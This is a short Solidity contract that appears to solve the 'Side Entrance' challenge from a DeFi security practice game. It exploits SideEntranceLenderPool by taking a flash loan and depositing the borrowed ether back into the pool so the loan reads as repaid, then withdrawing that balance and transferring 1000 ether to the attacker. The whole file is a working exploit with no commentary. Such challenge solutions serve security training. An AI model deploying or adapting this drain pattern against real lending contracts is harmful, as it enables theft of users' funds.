// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

contract FlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;
    address payable public owner;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        owner = payable(msg.sender);
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    function attack() external {
        pool.flashLoan(1000 ether);
        pool.withdraw();
        owner.transfer(1000 ether);
    }

    receive() external payable {}
}
